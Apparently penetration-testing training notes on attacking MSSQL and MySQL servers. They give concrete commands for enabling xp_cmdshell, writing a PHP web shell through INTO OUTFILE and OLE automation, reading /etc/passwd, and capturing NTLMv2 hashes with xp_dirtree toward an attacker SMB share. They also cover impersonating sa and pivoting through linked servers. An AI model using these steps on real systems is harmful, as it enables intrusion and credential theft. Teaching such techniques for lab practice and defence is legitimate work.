### Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system.

### Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server):

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

In the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.

In this timing attack, MySQL repeatedly attempts to authenticate to a server with the same incorrect password, until we get an indication that the correct password has been found, it works because the server takes longer to respond to an incorrect password than to a correct one.

#### Misconfiguration

Misconfigured authentication can let us access the service without credentials in case anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL server.

#### Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

- Read or change the contents of a database
    
- Read or change the server configuration
    
- Execute commands
    
- Read local files
    
- Communicate with other databases
    
- Capture the local system hash
    
- Impersonate existing users
    
- Gain access to other networks

### Protocol Specific Attacks

#### MySQL - Connecting to the SQL Server
```shell-session
$ mysql -u <username> -p<password> -h <ip address>
```

#### Sqlcmd - Connecting to the SQL Server
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U <username> -P '<password>' -y 30 -Y 30

1>
```

**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:
```shell-session
$ sqsh -S <ip address> -U <username> -P '<password>' -h
```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

```shell-session
$ mssqlclient.py -p 1433 <username>@<ip address> 
```

**Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

When using Windows authentication we should specify the domain name or hostname, or else it will assume SQL server authentication, if we are targeting a local account we can use `SERVERNAME\\accountname` or `.\\accountname`:
```shell-session
$ sqsh -S <ip address> -U .\\<username> -P '<password>' -h
```

#### SQL Default Databases

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

#### SQL Syntax

##### Show Databases
```shell-session
mysql> SHOW DATABASES;
```

in `sqlcmd` we will need to use GO:
```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

##### Select a Database
```shell-session
mysql> USE htbusers;
```
```cmd-session
1> USE htbusers
2> go
```

##### Show Tables
```shell-session
mysql> SHOW TABLES;
```
```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

##### Select all Data from Table users
```shell-session
mysql> SELECT * FROM users;
```
```cmd-session
1> SELECT * FROM users
2> go
```

### Execute Commands

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

#### XP_CMDSHELL
```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
go 

-- To update the currently configured value for this feature.  
RECONFIGURE
go
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

### Write Local Files

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands.

#### MySQL - Write Local File
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

#### MySQL - Secure File Privileges
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

#### Read Local Files in MSSQL
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

#### MySQL - Read Local Files
```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```

### Capture MSSQL Service Hash

We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories. When we use one of those stored procedures and point it to our SMB server, the directory listing functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL server.

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

#### XP_DIRTREE Hash Stealing
```cmd-session
1> EXEC master..xp_dirtree '\\<attacker ip>\share\'
2> GO
```

#### XP_SUBDIRS Hash Stealing
```cmd-session
1> EXEC master..xp_subdirs '\\<attacker ip>\share\'
2> GO
```

#### XP_SUBDIRS Hash Stealing with Responder
```shell-session
$ sudo responder -I tun0
```

#### XP_SUBDIRS Hash Stealing with Impacket
```shell-session
$ sudo impacket-smbserver share ./ -smb2support
```

### Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

#### Identify Users we Can Impersonate
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

#### Verify our Current User and Role
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

The returned value `0` indicates we don't have the sysadmin role, but impersonating as the `sa` user will let us execute the same command. For impersonating we can use Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

#### Impersonating the SA User
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

To revert the operation we can use the Transact-SQL statement `REVERT`.

**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

### Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine), they are usually configured to enable the database engine to execute a Transact-SQL statement that includes table in another instance of SQL server, or another database product such as Oracle.

With access to SQL server configured with linked servers we might be able to move laterally to the linked server. Administrators can configure a linked server using the credentials from the remote server, if those credentials have sysadmin privileges we might be able to execute commands.

#### Identify linked Servers in MSSQL
```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

1 means is a remote server, 0 means is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers.

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

## Latest SQL Vulnerabilities

### The Concept of the Attack

We will focus on the undocumented MSSQL server function called `xp_dirtree`, this function is used to view the contents of a specific folder (local or remote). This function also provides some additional parameters that can be specified, including the depth, how far should the function go in the folder, and the actual target folder.

The function isn't directly a vulnerability, but takes advantage of the authentication mechanisms of SMB, a Windows host that tries to authenticate to a shared folder automatically sends an NTLMv2 hash for authentication.

We can use this hash in a lot of way. This includes SMB Relay attack, where we replay the hash to log into other systems where the account as local admin privileges or cracking this hash on our local system. Microsoft patched an older flaw that allowed an SMB Relay back to the originating host, but we could possibly gain local admin on another host, then steal credentials which can be reused to gain local admin access to the original host.

### Initiation of the Attack
|**Step**|**XP_DIRTREE**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|The source here is the user input, which specifies the function and the folder shared in the network.|`Source`|
|`2.`|The process should ensure that all contents of the specified folder are displayed to the user.|`Process`|
|`3.`|The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands.|`Privileges`|
|`4.`|The SMB service is used as the destination to which the specified information is forwarded.|`Destination`|

### Steal the Hash
| **Step** | **Stealing the Hash**                                                                                                       | **Concept of Attacks - Category** |
| -------- | --------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `5.`     | Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service. | `Source`                          |
| `6.`     | The data is then processed, and the specified folder is queried for the contents.                                           | `Process`                         |
| `7.`     | The associated authentication hash is used accordingly since the MSSQL running user queries the service.                    | `Privileges`                      |
| `8.`     | In this case, the destination for the authentication and query is the host we control and the shared folder on the network. | `Destination`                     |

Finally, the hash is intercepted by tools like `Responder`, `WireShark`, or `TCPDump` and displayed to us. Apart from that there are many different ways to execute commands in MSSQL, for example execute Python code in a SQL query. We can find more about this in the [documentation](https://docs.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15) from Microsoft.